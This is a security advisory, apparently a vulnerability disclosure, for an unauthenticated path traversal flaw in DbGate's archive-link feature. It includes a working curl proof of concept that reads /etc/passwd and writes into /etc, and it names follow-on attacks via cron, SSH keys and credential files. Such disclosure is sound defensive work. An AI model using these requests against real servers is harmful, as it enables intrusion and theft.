# Arbitrary File Read/Write/Delete via Archive Link Path Traversal in DbGate

| Field | Value |
|-------|-------|
| **Project** | [dbgate/dbgate](https://github.com/dbgate/dbgate) |
| **Vulnerability Type** | Path Traversal (CWE-22), Link Following (CWE-59) |
| **Severity** | Critical — CVSS 3.1 Base Score: **9.8** |
| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Affected Versions** | <= 7.2.5 (verified on 7.2.5, latest release as of 2026-08-14) |
| **Authentication** | None (default anonymous deployment) |

---

## Summary

The `archive/create-link` endpoint creates `.link` files that store a target directory path in plaintext. The `linkedFolder` parameter is only validated via `assertSafeArchiveName(path.parse(linkedFolder).name)`, which only checks the basename (e.g., `etc`), while the **full absolute path** (e.g., `/etc`) is written to the `.link` file without restriction. The `resolveArchiveFolder()` function then returns this attacker-controlled path for all subsequent archive operations (`files/load`, `files/save`, `archive/saveText`, etc.), enabling arbitrary file read, write, and delete on the entire filesystem.

In the default Docker deployment, DbGate ships with anonymous authentication enabled (`{"amoid":"none"}`), so any network peer can exploit this without credentials — equivalent to **unauthenticated remote code execution** by writing to `/etc/cron.d/` or `~/.ssh/authorized_keys`.

## Details

In `packages/api/src/controllers/archive.js`, `createLink` only validates the basename of `linkedFolder`:

```javascript
createLink_meta: true,
async createLink({ linkedFolder }) {
    assertSafeArchiveName(path.parse(linkedFolder).name, 'linkedFolder');  // Only checks basename!
    const folder = await this.getNewArchiveFolder({ database: path.parse(linkedFolder).name + '.link' });
    await fs.writeFile(path.join(archivedir(), folder), linkedFolder);  // Writes full path, e.g., /etc
    clearArchiveLinksCache();
    return folder;
}
```

`resolveArchiveFolder()` in `packages/api/src/utility/directories.js` reads the `.link` file and returns its raw content as the directory path with no validation:

```javascript
function resolveArchiveFolder(folder) {
    if (folder.endsWith('.link')) {
        if (!archiveLinksCache[folder]) {
            archiveLinksCache[folder] = fs.readFileSync(path.join(archivedir(), folder), 'utf-8');
        }
        return archiveLinksCache[folder];  // Returns attacker-controlled path, e.g., /etc
    }
    return path.join(archivedir(), folder);
}
```

This resolved path is then used by multiple endpoints as their base directory:

| Endpoint | Operation | Impact |
|----------|-----------|--------|
| `POST /files/load` | `fs.readFile()` | Arbitrary file read |
| `POST /files/save` | `fs.writeFile()` | Arbitrary file write |
| `POST /archive/saveText` | `fs.writeFile()` | Arbitrary file write |
| `POST /archive/loadFiles` | `fs.readdir()` | Directory listing |

When the `folder` parameter uses the `archive:` prefix (e.g., `archive:etc.link`), the code extracts the suffix after `archive:` and passes it to `resolveArchiveFolder()`, triggering the path traversal.

## PoC

Verified on DbGate 7.2.5 Docker (default anonymous deployment, port 3000):

**Step 1: Obtain anonymous JWT**

```bash
curl -s -X POST http://TARGET:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"amoid":"none"}'
```
```
{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhbW9pZCI6Im5vbmUiLCJpYXQiOjE3ODY2Nzc0NDMsImV4cCI6MTc4Njc2Mzg0M30.1Wx405Tl_uknYkIUujwhRQ5nciP5KNkekHsDKGqnInI"}
```

**Step 2: Create archive link pointing to `/etc`**

```bash
curl -s -X POST http://TARGET:3000/archive/create-link \
  -H "Authorization: Bearer <JWT>" \
  -H "Content-Type: application/json" \
  -d '{"linkedFolder":"/etc"}'
```
```
"etc3.link"
```

**Step 3: Read `/etc/passwd` via arbitrary file read**

```bash
curl -s -X POST http://TARGET:3000/files/load \
  -H "Authorization: Bearer <JWT>" \
  -H "Content-Type: application/json" \
  -d '{"folder":"archive:etc.link","file":"passwd","format":"text"}'
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**Step 4: Write arbitrary file to `/etc`**

```bash
curl -s -X POST http://TARGET:3000/files/save \
  -H "Authorization: Bearer <JWT>" \
  -H "Content-Type: application/json" \
  -d '{"folder":"archive:etc.link","file":"dbgate_poc.txt","data":"PWNED","format":"text"}'
```
```
true
```

File confirmed on the filesystem via the `runners/files` directory listing (see companion advisory), showing `dbgate_poc.txt` with 5 bytes under `/etc`.

![PoC Screenshot](poc_01_archive_link.png)

---

## Impact

An unauthenticated attacker can read, write, or delete any file on the DbGate server filesystem, equivalent to full system compromise. This enables:

- **Remote Code Execution** — by writing to `/etc/cron.d/`, `~/.ssh/authorized_keys`, or systemd service files to achieve persistent shell access as the DbGate process user (root in Docker)
- **Credential Theft** — reading `/etc/shadow`, `~/.dbgate/connections.jsonl` (database credentials), SSH private keys, and SSL certificates
- **Data Destruction** — deleting critical system files causing permanent denial of service

Since DbGate ships with anonymous authentication enabled by default, this is exploitable by any network peer without credentials.
